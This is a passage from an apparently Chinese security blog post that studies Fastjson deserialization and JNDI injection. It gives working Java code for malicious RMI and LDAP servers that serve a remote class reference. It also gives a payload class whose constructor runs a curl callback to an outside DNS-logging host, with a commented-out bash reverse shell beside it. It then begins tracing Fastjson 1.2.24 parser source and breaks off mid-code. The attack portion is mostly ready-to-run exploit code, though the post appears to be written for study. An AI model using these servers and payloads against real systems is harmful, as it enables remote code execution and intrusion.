</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.RMIServer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EXEC</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">EXEC</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// String command = &#34;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/127.0.0.1/7000 0&gt;&amp;1&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">command</span> <span class="o">=</span> <span class="s">&#34;curl http://rmi.f15e86f1.dns.1433.eu.org&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">pc</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">EXEC</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;learn.RMIServer.EXEC&#34;</span><span class="o">,</span> <span class="s">&#34;learn.RMIServer.EXEC&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;exp&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span><span class="c1">// rmi://127.0.0.1:1099/exp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png, https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png 1.5x, https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png"
        title="https://img.mi3aka.eu.org/2023/02/61389fee6c73d19acc1fab501f944b89.png" /></p>
<ol start="3">
<li>LDAP调用</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.LDAPServer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">&#34;dc=example,dc=com&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">http_server_ip</span> <span class="o">=</span> <span class="s">&#34;10.10.10.1&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ldap_port</span> <span class="o">=</span> <span class="mi">1389</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">http_server_port</span> <span class="o">=</span> <span class="mi">8000</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span><span class="o">(</span><span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// e.addAttribute(&#34;javaClassName&#34;, &#34;learn.LDAPServer.EXEC&#34;);// 类名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// e.addAttribute(&#34;javaFactory&#34;, &#34;learn.LDAPServer.EXEC&#34;);//工厂类名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="o">,</span> <span class="s">&#34;http://&#34;</span> <span class="o">+</span> <span class="n">http_server_ip</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">http_server_port</span> <span class="o">+</span> <span class="s">&#34;/&#34;</span><span class="o">);</span><span class="c1">// 设置远程的恶意引用对象的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;objectClass&#34;</span><span class="o">,</span> <span class="s">&#34;javaNamingReference&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaClassName&#34;</span><span class="o">,</span> <span class="s">&#34;EXEC&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaFactory&#34;</span><span class="o">,</span> <span class="s">&#34;EXEC&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span><span class="c1">// 创建LDAP配置对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span><span class="s">&#34;listen&#34;</span><span class="o">,</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="o">),</span> <span class="n">ldap_port</span><span class="o">,</span>
</span></span><span class="line"><span class="cl">                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span> <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
</span></span><span class="line"><span class="cl">                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span><span class="c1">// 设置LDAP监听配置信息
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">());</span><span class="c1">// 添加自定义的LDAP操作拦截器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span><span class="c1">// 创建LDAP服务对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span><span class="c1">// 开始监听
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span> <span class="o">+</span> <span class="n">ldap_port</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>位于另一台服务器上的<code>EXEC.class</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EXEC</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">EXEC</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// String command = &#34;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/127.0.0.1/7000 0&gt;&amp;1&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">command</span> <span class="o">=</span> <span class="s">&#34;curl http://ldap.c932a1f0.dns.1433.eu.org&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">pc</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">EXEC</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png, https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png 1.5x, https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png"
        title="https://img.mi3aka.eu.org/2023/02/42f8f8ee7bcb33289c651f676d1a65e2.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png, https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png 1.5x, https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png"
        title="https://img.mi3aka.eu.org/2023/02/0c538189be63e79682a1ecca122c758f.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png, https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png 1.5x, https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png"
        title="https://img.mi3aka.eu.org/2023/02/f7d2706adcf3ec89f1202e767207d6d5.png" /></p>
<h2 id="1224">1.2.24</h2>
<h3 id="黑名单处理方法">黑名单处理方法</h3>
<p>首先在<code>DefaultJSONParser</code>对json字符串进行解析,当解析到<code>@type</code>时,将对应的值提取出来后,通过<code>TypeUtils.loadClass</code>进行<code>loadClass</code>操作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.DefaultJSONParser
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="nf">DefaultJSONParser</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">input</span><span class="o">,</span> <span class="kd">final</span> <span class="n">JSONLexer</span> <span class="n">lexer</span><span class="o">,</span> <span class="kd">final</span> <span class="n">ParserConfig</span> <span class="n">config</span><span class="o">){</span><span class="c1">// 因为&#34;{}&#34;,因此token的值为12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="o">.</span><span class="na">lexer</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">input</span> <span class="o">=</span> <span class="n">input</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">config</span> <span class="o">=</span> <span class="n">config</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">symbolTable</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="na">symbolTable</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">ch</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">.</span><span class="na">getCurrent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;{&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">lexer</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">((</span><span class="n">JSONLexerBase</span><span class="o">)</span> <span class="n">lexer</span><span class="o">).</span><span class="na">token</span> <span class="o">=</span> <span class="n">JSONToken</span><span class="o">.</span><span class="na">LBRACE</span><span class="o">;</span> <span class="c1">// 12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">ch</span> <span class="o">==</span> <span class="sc">&#39;[&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">lexer</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">((</span><span class="n">JSONLexerBase</span><span class="o">)</span> <span class="n">lexer</span><span class="o">).</span><span class="na">token</span> <span class="o">=</span> <span class="n">JSONToken</span><span class="o">.</span><span class="na">LBRACKET</span><span class="o">;</span> <span class="c1">// 14
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">lexer</span><span class="o">.</span><span class="na">nextToken</span><span class="o">();</span> <span class="c1">// prime the pump
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.DefaultJSONParser
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">parse</span><span class="o">(</span><span class="n">Object</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">JSONLexer</span> <span class="n">lexer</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">lexer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="o">(</span><span class="n">lexer</span><span class="o">.</span><span class="na">token</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">LBRACE</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">JSONObject</span> <span class="n">object</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONObject</span><span class="o">(</span><span class="n">lexer</span><span class="o">.</span><span class="na">isEnabled</span><span class="o">(</span><span class="n">Feature</span><span class="o">.</span><span class="na">OrderedField</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">parseObject</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="n">fieldName</span><span class="o">);</span><span class="c1">//开始解析json字符串
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.DefaultJSONParser
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">parseObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">Map</span> <span class="n">object</span><span class="o">,</span> <span class="n">Object</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">JSONLexer</span> <span class="n">lexer</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">lexer</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ParseContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">boolean</span> <span class="n">setContextFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(;;)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">lexer</span><span class="o">.</span><span class="na">skipWhitespace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="n">lexer</span><span class="o">.</span><span class="na">getCurrent</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="o">...</span>
</span></span><span class="line"><span class="cl">                <span class="kt">boolean</span> <span class="n">isObjectKey</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
